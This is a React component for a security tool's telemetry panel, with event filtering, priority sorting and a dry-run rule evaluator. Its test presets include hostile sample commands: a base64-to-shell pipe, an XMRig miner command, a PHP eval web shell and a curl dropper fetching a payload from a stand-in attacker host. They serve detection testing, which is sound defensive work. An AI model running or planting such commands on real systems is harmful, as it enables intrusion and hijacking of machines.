import { useState, useEffect, useMemo } from "react";
import { invoke } from "../lib/ipc/core";
import { useProcessStore } from "../store/processStore";
import type { TelemetryEvent } from "../types";

type SeverityFilter = "all" | "critical" | "high" | "warning" | "info";
type SortMode = "priority" | "newest";

function getSeverityBucket(ev: TelemetryEvent): "critical" | "high" | "warning" | "info" {
  const sev = String(ev.severity || "").toLowerCase();
  if (sev === "critical" || ev.score >= 90) {
    return "critical";
  }
  if (sev === "high" || ev.score >= 70 || ev.verdict === "alert") {
    return "high";
  }
  if (sev === "medium" || (ev.score >= 35 && ev.score < 70) || ev.verdict === "monitored") {
    return "warning";
  }
  return "info";
}

function getPriorityWeight(ev: TelemetryEvent): number {
  const bucket = getSeverityBucket(ev);
  if (bucket === "critical") return 4;
  if (bucket === "high") return 3;
  if (bucket === "warning") return 2;
  return 1;
}

export default function TelemetryLogPanel() {
  const { store, dispatch } = useProcessStore();
  const telemetry = store.telemetry;
  const [search, setSearch] = useState("");
  const [severityFilter, setSeverityFilter] = useState<SeverityFilter>("all");
  const [verdictFilter, setVerdictFilter] = useState<"all" | "alert" | "monitored" | "suppressed" | "clean">("all");
  const [sortMode, setSortMode] = useState<SortMode>("priority");
  const [expandedId, setExpandedId] = useState<string | null>(null);

  // Live Evaluator state
  const [showEvaluator, setShowEvaluator] = useState(false);
  const [evalProcess, setEvalProcess] = useState("curl");
  const [evalParent, setEvalParent] = useState("bash");
  const [evalCmd, setEvalCmd] = useState("curl -fsSL https://registry.npmjs.org/express");
  const [evalUid, setEvalUid] = useState("1000");
  const [evalDestination, setEvalDestination] = useState("registry.npmjs.org");
  const [evalResult, setEvalResult] = useState<any | null>(null);
  const [evaluating, setEvaluating] = useState(false);

  // Sync latest telemetry buffer from backend IPC
  useEffect(() => {
    invoke<TelemetryEvent[]>("list_telemetry", { limit: 200 })
      .then((res) => {
        if (Array.isArray(res)) {
          dispatch({ type: "SET_TELEMETRY", payload: res });
        }
      })
      .catch((err) => console.error("Failed to load telemetry:", err));
  }, [dispatch]);

  const runEvaluator = async () => {
    setEvaluating(true);
    try {
      const res = await invoke<any>("evaluate_command", {
        process_name: evalProcess.trim(),
        parent_name: evalParent.trim(),
        cmdline: evalCmd.trim().split(" "),
        uid: parseInt(evalUid, 10) || 1000,
        destination: evalDestination.trim(),
      });
      setEvalResult(res);
    } catch (err) {
      console.error("Evaluation failed:", err);
    } finally {
      setEvaluating(false);
    }
  };

  const severityCounts = useMemo(() => {
    let critical = 0;
    let high = 0;
    let warning = 0;
    let info = 0;
    for (const ev of telemetry) {
      const b = getSeverityBucket(ev);
      if (b === "critical") critical++;
      else if (b === "high") high++;
      else if (b === "warning") warning++;
      else info++;
    }
    return { critical, high, warning, info, total: telemetry.length };
  }, [telemetry]);

  const filteredEvents = useMemo(() => {
    const filtered = telemetry.filter((ev) => {
      if (severityFilter !== "all" && getSeverityBucket(ev) !== severityFilter) return false;
      if (verdictFilter !== "all" && ev.verdict !== verdictFilter) return false;
      if (search) {
        const q = search.toLowerCase();
        const matchesName = ev.process.toLowerCase().includes(q);
        const matchesParent = ev.parent.toLowerCase().includes(q);
        const matchesDetail = ev.detail.toLowerCase().includes(q);
        const matchesMitre = (ev.mitre || "").toLowerCase().includes(q);
        const matchesRule = (ev.rule || "").toLowerCase().includes(q);
        const matchesCmd = (ev.cmdline || []).join(" ").toLowerCase().includes(q);
        return matchesName || matchesParent || matchesDetail || matchesMitre || matchesRule || matchesCmd;
      }
      return true;
    });

    return [...filtered].sort((a, b) => {
      if (sortMode === "priority") {
        const pw = getPriorityWeight(b) - getPriorityWeight(a);
        if (pw !== 0) return pw;
        const scoreDiff = (b.score || 0) - (a.score || 0);
        if (scoreDiff !== 0) return scoreDiff;
      }
      return Number(b.ts) - Number(a.ts);
    });
  }, [telemetry, severityFilter, verdictFilter, search, sortMode]);

  return (
    <div className="panel">
      {/* Panel Header */}
      <div className="panel-header">
        <span className="panel-title">INTERNAL MOVEMENTS & TELEMETRY STREAM</span>
        <span className="pstat">{telemetry.length} EVENTS RECORDED</span>
        <span className="pstat" style={{ color: "var(--teall)", borderColor: "var(--teal)" }}>
          AUTO-TUNING FP FILTER ACTIVE
        </span>

        <div className="toolbar-right">
          <button
            className={`sm-btn ${showEvaluator ? "sm-btn--active" : ""}`}
            onClick={() => setShowEvaluator(!showEvaluator)}
            title="Interactive Rule & Risk Scoring Evaluator"
          >
            ⚙ RULE EVALUATOR
          </button>

          <input
            className="search-input"
            type="text"
            placeholder="Search PID, MITRE, cmd…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            style={{ width: 175 }}
          />
        </div>
      </div>

      {/* Interactive Dry-Run Rule Evaluator Drawer (read-only formula check, zero telemetry side effects) */}
      {showEvaluator && (
        <div
          style={{
            padding: "12px 16px",
            background: "var(--bg1)",
            borderBottom: "1px solid var(--border2)",
            display: "flex",
            flexDirection: "column",
            gap: 10,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "var(--vl)", letterSpacing: "0.08em" }}>
              READ-ONLY DRY-RUN RULE EVALUATOR (NO TELEMETRY OR INCIDENT SIDE EFFECTS)
            </span>
            <span style={{ fontSize: 9, color: "var(--tx2)" }}>
              Checks how the scoring matrix classifies a command without injecting fake events.
            </span>
          </div>

          {/* Presets Bar */}
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", alignItems: "center" }}>
            <span style={{ fontSize: 8, color: "var(--tx2)", fontWeight: 700, letterSpacing: "0.06em" }}>
              QUICK TEST PRESETS:
            </span>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("npm");
                setEvalParent("bash");
                setEvalCmd("npm install --save express");
                setEvalUid("1000");
                setEvalDestination("registry.npmjs.org");
              }}
            >
              ✓ Benign Dev: npm
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("ps");
                setEvalParent("bash");
                setEvalCmd("ps aux | grep root");
                setEvalUid("1000");
                setEvalDestination("");
              }}
            >
              ✓ Benign Admin: ps aux
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("bash");
                setEvalParent("cron");
                setEvalCmd("echo 'c2NyaXB0' | base64 -d | sh");
                setEvalUid("1000");
                setEvalDestination("");
              }}
            >
              ⚠ Medium: base64 pipe
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("xmrig");
                setEvalParent("bash");
                setEvalCmd("/usr/local/bin/xmrig -o stratum+tcp://pool.minexmr.com:4444");
                setEvalUid("1000");
                setEvalDestination("pool.minexmr.com");
              }}
              style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
            >
              Virus: XMRig Miner
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("php");
                setEvalParent("nginx");
                setEvalCmd("php -r '@eval(base64_decode($_POST[\"c99sh\"]));'");
                setEvalUid("33");
                setEvalDestination("");
              }}
              style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
            >
              Virus: C99 WebShell
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("curl");
                setEvalParent("nginx");
                setEvalCmd("curl -fsSL http://cobalt-strike.bad/stage.bin -o /dev/shm/.kworker");
                setEvalUid("33");
                setEvalDestination("cobalt-strike.bad");
              }}
              style={{ borderColor: "rgba(220,38,38,.7)", color: "var(--redl)" }}
            >
              Critical: C2 Dropper
            </button>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "120px 120px 70px 1fr 180px auto", gap: 8, alignItems: "center" }}>
            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>PROCESS</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalProcess}
                onChange={(e) => setEvalProcess(e.target.value)}
                placeholder="e.g. curl, python3, bash"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>PARENT PROCESS</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalParent}
                onChange={(e) => setEvalParent(e.target.value)}
                placeholder="e.g. nginx, sshd, bash"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>UID</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalUid}
                onChange={(e) => setEvalUid(e.target.value)}
                placeholder="1000"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>COMMAND LINE</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalCmd}
                onChange={(e) => setEvalCmd(e.target.value)}
                placeholder="Full command string..."
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>DESTINATION HOST / IP</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalDestination}
                onChange={(e) => setEvalDestination(e.target.value)}
                placeholder="e.g. registry.npmjs.org"
              />
            </div>

            <div style={{ paddingTop: 14 }}>
              <button
                className="action-btn"
                onClick={runEvaluator}
                disabled={evaluating}
                style={{ height: 28, padding: "0 14px" }}
              >
                {evaluating ? "EVALUATING…" : "EVALUATE"}
              </button>
            </div>
          </div>

          {/* Evaluation Outcome */}
          {evalResult && (
            <div
              style={{
                marginTop: 6,
                padding: "10px 14px",
                background: "var(--bg3)",
                border: "1px solid var(--border)",
                borderRadius: 4,
                display: "flex",
                flexDirection: "column",
                gap: 6,
              }}
            >
              {/* Virus Alert Box */}
              {evalResult.virus_match && (
                <div
                  style={{
                    padding: "6px 10px",
                    background: "rgba(220,38,38,.18)",
                    border: "1px solid var(--red)",
                    borderRadius: 3,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ fontSize: 10, fontWeight: 800, color: "var(--redl)" }}>
                      VIRUS SIGNATURE IDENTIFIED:
                    </span>
                    <strong style={{ fontSize: 11, color: "var(--tx0)" }}>
                      {evalResult.virus_match.name}
                    </strong>
                  </div>
                  <span
                    style={{
                      fontSize: 8,
                      fontWeight: 700,
                      padding: "1px 6px",
                      borderRadius: 2,
                      background: "rgba(220,38,38,.3)",
                      color: "var(--redl)",
                    }}
                  >
                    FAMILY: {evalResult.virus_match.family}
                  </span>
                </div>
              )}

              <div style={{ display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" }}>
                <span
                  style={{
                    fontSize: 12,
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 3,
                    background:
                      evalResult.score >= 90
                        ? "rgba(220,38,38,.2)"
                        : evalResult.score >= 70
                        ? "rgba(234,88,12,.2)"
                        : evalResult.score >= 45
                        ? "rgba(217,119,6,.2)"
                        : "rgba(13,148,136,.2)",
                    color:
                      evalResult.score >= 90
                        ? "var(--redl)"
                        : evalResult.score >= 70
                        ? "#fb923c"
                        : evalResult.score >= 45
                        ? "var(--amberl)"
                        : "var(--teall)",
                    border: "1px solid currentColor",
                  }}
                >
                  RISK SCORE: {evalResult.score}/100 [{(evalResult.severity || "informational").toUpperCase()}]
                </span>

                {/* Calibrated Rule Pill */}
                {evalResult.rule && (
                  <span
                    style={{
                      fontSize: 9,
                      fontWeight: 700,
                      fontFamily: "var(--mono)",
                      padding: "2px 8px",
                      borderRadius: 3,
                      background: "var(--bg1)",
                      color: "var(--tx0)",
                      border: "1px solid var(--border2)",
                    }}
                  >
                    RULE: {evalResult.rule}
                  </span>
                )}

                <span
                  style={{
                    fontSize: 9,
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 3,
                    background:
                      evalResult.verdict === "alert"
                        ? "rgba(220,38,38,.15)"
                        : evalResult.verdict === "monitored"
                        ? "rgba(217,119,6,.15)"
                        : evalResult.verdict === "suppressed"
                        ? "rgba(124,58,237,.15)"
                        : "rgba(13,148,136,.15)",
                    color:
                      evalResult.verdict === "alert"
                        ? "var(--redl)"
                        : evalResult.verdict === "monitored"
                        ? "var(--amberl)"
                        : evalResult.verdict === "suppressed"
                        ? "var(--vl)"
                        : "var(--teall)",
                    letterSpacing: "0.06em",
                  }}
                >
                  VERDICT: {evalResult.verdict.toUpperCase()}
                </span>

                <span style={{ fontSize: 10, color: "var(--tx1)" }}>
                  MITRE: <strong>{evalResult.mitre_tactic}</strong> ➔ {evalResult.mitre_technique}
                </span>
              </div>

              {/* Movement Flags */}
              {evalResult.flags && evalResult.flags.length > 0 && (
                <div style={{ display: "flex", gap: 5, flexWrap: "wrap", alignItems: "center" }}>
                  <span style={{ fontSize: 8, color: "var(--tx2)", fontWeight: 700 }}>FLAGS:</span>
                  {evalResult.flags.map((fl: string, i: number) => (
                    <span
                      key={i}
                      style={{
                        fontSize: 8,
                        fontFamily: "var(--mono)",
                        padding: "1px 5px",
                        borderRadius: 2,
                        background: fl.includes("VIRUS")
                          ? "rgba(220,38,38,.2)"
                          : fl.includes("DEV") || fl.includes("DIAG")
                          ? "rgba(13,148,136,.2)"
                          : "rgba(124,58,237,.15)",
                        color: fl.includes("VIRUS")
                          ? "var(--redl)"
                          : fl.includes("DEV") || fl.includes("DIAG")
                          ? "var(--teall)"
                          : "var(--vl)",
                        border: "1px solid currentColor",
                      }}
                    >
                      {fl}
                    </span>
                  ))}
                </div>
              )}

              <div style={{ fontSize: 10, color: "var(--tx1)", lineHeight: 1.5 }}>
                {evalResult.explanation}
              </div>

              {evalResult.factors && evalResult.factors.length > 0 && (
                <div style={{ marginTop: 4 }}>
                  <span style={{ fontSize: 8, color: "var(--tx2)", letterSpacing: "0.08em", fontWeight: 700 }}>
                    FACTOR BREAKDOWN:
                  </span>
                  <div style={{ display: "flex", flexDirection: "column", gap: 3, marginTop: 4 }}>
                    {evalResult.factors.map((f: any, i: number) => (
                      <div
                        key={i}
                        style={{
                          fontSize: 9,
                          display: "flex",
                          alignItems: "center",
                          gap: 8,
                          color: f.impact > 0 ? "var(--tx0)" : "var(--teall)",
                        }}
                      >
                        <span
                          style={{
                            fontWeight: 700,
                            minWidth: 40,
                            color: f.impact > 0 ? (f.impact >= 35 ? "var(--redl)" : "var(--amberl)") : "var(--teall)",
                          }}
                        >
                          {f.impact > 0 ? `+${f.impact}` : f.impact} pts
                        </span>
                        <strong style={{ minWidth: 160 }}>{f.name}:</strong>
                        <span style={{ color: "var(--tx1)" }}>{f.desc}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Filter Tabs & Severity Priority Bar */}
      <div className="cat-tabs" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 8 }}>
        <div style={{ display: "flex", gap: 2, alignItems: "center" }}>
          {(["all", "alert", "monitored", "suppressed", "clean"] as const).map((v) => (
            <div
              key={v}
              className={`cat-tab ${verdictFilter === v ? "cat-tab--active" : ""}`}
              onClick={() => setVerdictFilter(v)}
            >
              {v.toUpperCase()}
              <span className="cat-tab-count">
                {v === "all" ? telemetry.length : telemetry.filter((t) => t.verdict === v).length}
              </span>
            </div>
          ))}
        </div>

        <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
          {/* Priority Queue Summary Indicators */}
          <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
            <button
              type="button"
              className={`sm-btn ${severityFilter === "critical" ? "sm-btn--active" : ""}`}
              onClick={() => setSeverityFilter(severityFilter === "critical" ? "all" : "critical")}
              style={{ fontSize: 8, padding: "2px 6px", color: "var(--redl)", borderColor: "rgba(220,38,38,0.45)" }}
              title="Filter P1 Critical Threats (Score >= 90)"
            >
              P1 CRITICAL: {severityCounts.critical}
            </button>
            <button
              type="button"
              className={`sm-btn ${severityFilter === "high" ? "sm-btn--active" : ""}`}
              onClick={() => setSeverityFilter(severityFilter === "high" ? "all" : "high")}
              style={{ fontSize: 8, padding: "2px 6px", color: "#fb923c", borderColor: "rgba(234,88,12,0.45)" }}
              title="Filter P2 High Alerts (Score 70-89)"
            >
              P2 HIGH: {severityCounts.high}
            </button>
            <button
              type="button"
              className={`sm-btn ${severityFilter === "warning" ? "sm-btn--active" : ""}`}
              onClick={() => setSeverityFilter(severityFilter === "warning" ? "all" : "warning")}
              style={{ fontSize: 8, padding: "2px 6px", color: "var(--amberl)", borderColor: "rgba(217,119,6,0.45)" }}
              title="Filter P3 Medium Warnings (Score 35-69)"
            >
              P3 WARN: {severityCounts.warning}
            </button>
            <button
              type="button"
              className={`sm-btn ${severityFilter === "info" ? "sm-btn--active" : ""}`}
              onClick={() => setSeverityFilter(severityFilter === "info" ? "all" : "info")}
              style={{ fontSize: 8, padding: "2px 6px", color: "var(--teall)", borderColor: "rgba(13,148,136,0.45)" }}
              title="Filter P4 Informational / Clean Events"
            >
              P4 INFO: {severityCounts.info}
            </button>
          </div>

          {/* Severity Filtering Dropdown */}
          <label htmlFor="telemetry-severity-filter" style={{ fontSize: 9, color: "var(--tx2)", letterSpacing: "0.06em" }}>
            SEVERITY:
          </label>
          <select
            id="telemetry-severity-filter"
            aria-label="Filter telemetry logs by severity level"
            className="filter-select"
            value={severityFilter}
            onChange={(e) => setSeverityFilter(e.target.value as SeverityFilter)}
          >
            <option value="all">All Severities ({severityCounts.total})</option>
            <option value="critical">Critical P1 ({severityCounts.critical})</option>
            <option value="high">High P2 ({severityCounts.high})</option>
            <option value="warning">Warning P3 ({severityCounts.warning})</option>
            <option value="info">Info P4 ({severityCounts.info})</option>
          </select>

          {/* Priority Queue vs Chronological Order */}
          <button
            type="button"
            className={`sm-btn ${sortMode === "priority" ? "sm-btn--active" : ""}`}
            onClick={() => setSortMode((m) => (m === "priority" ? "newest" : "priority"))}
            style={{ fontSize: 8, padding: "3px 8px" }}
            title="Toggle between Security Priority Queue (P1 Critical -> P2 High -> P3 Warning -> P4 Info) and Chronological order"
          >
            {sortMode === "priority" ? "⇅ PRIORITY QUEUE" : "🕒 NEWEST FIRST"}
          </button>
        </div>
      </div>

      {/* Table Header */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "68px 72px 110px 175px 96px 86px 1fr 24px",
          padding: "5px 14px",
          fontSize: 9,
          color: "var(--tx2)",
          letterSpacing: "0.08em",
          textTransform: "uppercase",
          borderBottom: "1px solid var(--border)",
          background: "var(--bg1)",
          flexShrink: 0,
        }}
      >
        <span>TIME</span>
        <span>PRIORITY</span>
        <span>EVENT TYPE</span>
        <span>LINEAGE (PARENT ➔ PROC)</span>
        <span>RISK SCORE</span>
        <span>VERDICT</span>
        <span>DETAIL & TELEMETRY NOTES</span>
        <span></span>
      </div>

      {/* Telemetry Event Stream */}
      <div className="journal-list">
        {filteredEvents.length === 0 ? (
          <div className="empty-state">
            <div className="empty-icon">☵</div>
            <div>NO TELEMETRY EVENTS MATCHING FILTER</div>
          </div>
        ) : (
          filteredEvents.map((ev) => {
            const isExpanded = expandedId === ev.id;
            const timeStr = new Date(ev.ts).toLocaleTimeString("en-GB", { hour12: false });
            const sevBucket = getSeverityBucket(ev);

            let verdictColor = "var(--teall)";
            let verdictBg = "rgba(13,148,136,.15)";
            let verdictBorder = "var(--teal)";

            if (ev.verdict === "alert") {
              verdictColor = "var(--redl)";
              verdictBg = "rgba(220,38,38,.18)";
              verdictBorder = "var(--red)";
            } else if (ev.verdict === "monitored") {
              verdictColor = "var(--amberl)";
              verdictBg = "rgba(217,119,6,.18)";
              verdictBorder = "var(--amber)";
            } else if (ev.verdict === "suppressed") {
              verdictColor = "var(--vl)";
              verdictBg = "rgba(124,58,237,.18)";
              verdictBorder = "var(--vd)";
            }

            const priMeta =
              sevBucket === "critical"
                ? { label: "P1 CRIT", color: "var(--redl)", bg: "rgba(220,38,38,.2)", border: "var(--red)" }
                : sevBucket === "high"
                ? { label: "P2 HIGH", color: "#fb923c", bg: "rgba(234,88,12,.18)", border: "rgba(234,88,12,.7)" }
                : sevBucket === "warning"
                ? { label: "P3 WARN", color: "var(--amberl)", bg: "rgba(217,119,6,.18)", border: "var(--amber)" }
                : { label: "P4 INFO", color: "var(--tx1)", bg: "var(--bg3)", border: "var(--border2)" };

            return (
              <div
                key={ev.id}
                style={{
                  borderBottom: "1px solid rgba(37,37,50,.55)",
                  background: isExpanded ? "var(--bg3)" : "transparent",
                  borderLeft:
                    sevBucket === "critical"
                      ? "2px solid var(--red)"
                      : sevBucket === "high"
                      ? "2px solid #fb923c"
                      : sevBucket === "warning"
                      ? "2px solid var(--amber)"
                      : ev.verdict === "suppressed"
                      ? "2px solid var(--vl)"
                      : "2px solid transparent",
                }}
              >
                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "68px 72px 110px 175px 96px 86px 1fr 24px",
                    padding: "7px 14px",
                    alignItems: "center",
                    cursor: "pointer",
                    gap: 6,
                  }}
                  onClick={() => setExpandedId(isExpanded ? null : ev.id)}
                >
                  <span style={{ fontSize: 9, color: "var(--tx2)" }}>{timeStr}</span>

                  <div>
                    <span
                      style={{
                        fontSize: 8,
                        fontWeight: 700,
                        padding: "1px 5px",
                        borderRadius: 2,
                        background: priMeta.bg,
                        color: priMeta.color,
                        border: `1px solid ${priMeta.border}`,
                        letterSpacing: "0.04em",
                      }}
                    >
                      {priMeta.label}
                    </span>
                  </div>

                  <span
                    style={{
                      fontSize: 8,
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: 2,
                      background: "var(--bg4)",
                      color: "var(--tx1)",
                      border: "1px solid var(--border)",
                      textAlign: "center",
                      letterSpacing: "0.05em",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {ev.event_type}
                  </span>

                  <span
                    style={{
                      fontSize: 10,
                      color: "var(--tx0)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    <span style={{ color: "var(--tx2)" }}>{ev.parent}</span> ➔ <strong>{ev.process}</strong>
                    <span style={{ fontSize: 9, color: "var(--tx2)", marginLeft: 4 }}>[{ev.pid}]</span>
                  </span>

                  {/* Risk Score Meter */}
                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                    <div
                      style={{
                        width: 44,
                        height: 5,
                        background: "var(--bg4)",
                        borderRadius: 2,
                        overflow: "hidden",
                      }}
                    >
                      <div
                        style={{
                          height: "100%",
                          width: `${Math.max(ev.score, 4)}%`,
                          background:
                            ev.score >= 90
                              ? "var(--red)"
                              : ev.score >= 70
                              ? "var(--amberl)"
                              : ev.score >= 45
                              ? "var(--amber)"
                              : "var(--teal)",
                        }}
                      />
                    </div>
                    <span
                      style={{
                        fontSize: 9,
                        fontWeight: 700,
                        color:
                          ev.score >= 90
                            ? "var(--redl)"
                            : ev.score >= 70
                            ? "#fb923c"
                            : ev.score >= 45
                            ? "var(--amberl)"
                            : "var(--tx2)",
                      }}
                    >
                      {ev.score}
                    </span>
                  </div>

                  {/* Verdict Badge */}
                  <div>
                    <span
                      style={{
                        fontSize: 8,
                        fontWeight: 700,
                        padding: "1px 6px",
                        borderRadius: 2,
                        background: verdictBg,
                        color: verdictColor,
                        border: `1px solid ${verdictBorder}`,
                        letterSpacing: "0.04em",
                      }}
                    >
                      {ev.verdict.toUpperCase()}
                    </span>
                  </div>

                  <span
                    style={{
                      fontSize: 10,
                      color: sevBucket === "critical" ? "var(--tx0)" : "var(--tx1)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    {ev.detail}
                  </span>

                  <span style={{ fontSize: 10, color: "var(--tx2)", textAlign: "center" }}>
                    {isExpanded ? "▲" : "▼"}
                  </span>
                </div>

                {/* Expanded Details */}
                {isExpanded && (
                  <div
                    style={{
                      padding: "8px 18px 12px 24px",
                      background: "rgba(7,7,10,.75)",
                      borderTop: "1px solid var(--border)",
                      display: "flex",
                      flexDirection: "column",
                      gap: 6,
                    }}
                  >
                    {ev.rule && (
                      <div className="meta-row">
                        <span className="meta-label">RULE / TIER</span>
                        <span style={{ fontSize: 10, color: priMeta.color, fontWeight: 700 }}>
                          {ev.rule} ({priMeta.label})
                        </span>
                      </div>
                    )}

                    {ev.explanation && (
                      <div className="meta-row">
                        <span className="meta-label">ANALYSIS</span>
                        <span className="meta-val">{ev.explanation}</span>
                      </div>
                    )}

                    {ev.cmdline && ev.cmdline.length > 0 && (
                      <div className="meta-row">
                        <span className="meta-label">COMMAND</span>
                        <code className="meta-code" style={{ fontSize: 10 }}>
                          {ev.cmdline.join(" ")}
                        </code>
                      </div>
                    )}

                    {ev.mitre && (
                      <div className="meta-row">
                        <span className="meta-label">MITRE TACTIC</span>
                        <span style={{ fontSize: 10, color: "var(--vl)", fontWeight: 600 }}>{ev.mitre}</span>
                      </div>
                    )}

                    {ev.suppression_reason && (
                      <div
                        style={{
                          padding: "6px 10px",
                          background: "rgba(124,58,237,.06)",
                          borderLeft: "2px solid var(--vd)",
                          fontSize: 10,
                          color: "var(--vl)",
                          lineHeight: 1.5,
                        }}
                      >
                        <strong>Auto-Tuning Suppression Engine:</strong> {ev.suppression_reason}
                      </div>
                    )}

                    <div className="meta-row">
                      <span className="meta-label">PROCESS LINEAGE</span>
                      <span className="meta-val">
                        Parent PID: {ev.ppid ?? 0} ({ev.parent}) ➔ Child PID: {ev.pid} ({ev.process})
                      </span>
                    </div>

                    <div className="meta-row">
                      <span className="meta-label">TIMESTAMP</span>
                      <span className="meta-val">{new Date(ev.ts).toISOString()}</span>
                    </div>
                  </div>
                )}
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
